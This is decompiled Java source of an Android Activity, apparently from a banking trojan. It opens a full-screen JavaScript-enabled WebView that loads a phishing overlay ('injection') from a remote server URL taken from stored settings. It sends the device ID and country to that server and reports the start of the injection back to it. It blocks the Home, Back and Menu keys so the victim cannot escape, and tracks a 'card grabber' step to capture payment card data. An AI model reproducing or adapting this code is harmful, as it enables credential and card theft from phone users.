package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;

public class ozkgyjpxtyxajmm extends Activity {

    /* renamed from: a */
    C0039c f463a = new C0039c();

    /* renamed from: b */
    C0034b f464b = new C0034b();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm$a */
    private class C0056a extends WebChromeClient {
        private C0056a() {
        }

        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm$b */
    private class C0057b extends WebViewClient {
        private C0057b() {
        }

        public void onPageFinished(WebView webView, String str) {
            ozkgyjpxtyxajmm.this.f464b.mo213a("Start Activity Inject", str);
            if (str.contains("a10.php") && !str.contains("STOP")) {
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "save_inj", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "lock_inj", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "timeStartGrabber", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "name", "false");
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
            }
            if (str.contains("STOP")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                ozkgyjpxtyxajmm.this.finish();
            }
            if (str.contains("exitdagjhadfjedgjsfhexitlgdgsfhafg")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                ozkgyjpxtyxajmm.this.finish();
            }
            if (str.contains("|Grabber card step 3|")) {
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "save_inj", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "lock_inj", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "timeStartGrabber", "");
                ozkgyjpxtyxajmm.this.f464b.mo233d(ozkgyjpxtyxajmm.this, "name", "false");
            }
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /* access modifiers changed from: protected */
    @SuppressLint({"SetJavaScriptEnabled"})
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    public void onDestroy() {
        super.onDestroy();
        this.f464b.mo233d(this, "name", "false");
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
    }

    /* access modifiers changed from: protected */
    public void onStart() {
        super.onStart();
        this.f464b.mo233d(this, "name", "true");
        String e = this.f464b.mo234e(this, "str_push_fish");
        if (!e.equals("") || !e.equals(null)) {
            this.f463a.getClass();
            String str = "";
            try {
                str = this.f464b.mo234e(this, "urlInj");
            } catch (Exception unused) {
            }
            StringBuilder sb = new StringBuilder();
            sb.append("");
            sb.append(e);
            this.f464b.mo213a("START INJ", sb.toString());
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(0);
            webView.setWebViewClient(new C0057b());
            webView.setWebChromeClient(new C0056a());
            String country = Resources.getSystem().getConfiguration().locale.getCountry();
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str);
            sb2.append("/fafa.php?f=");
            sb2.append(e);
            sb2.append("&p=");
            sb2.append(this.f464b.mo247q(this));
            sb2.append("|");
            sb2.append(country.toLowerCase());
            webView.loadUrl(sb2.toString());
            setContentView(webView);
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            C0034b bVar = this.f464b;
            StringBuilder sb4 = new StringBuilder();
            sb4.append(this.f464b.mo247q(this));
            sb4.append("|Start injection ");
            sb4.append(e);
            sb4.append("|");
            sb3.append(bVar.mo225c(sb4.toString()));
            this.f464b.mo218b(this, "4", sb3.toString());
        }
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
        this.f464b.mo233d(this, "name", "false");
    }
}
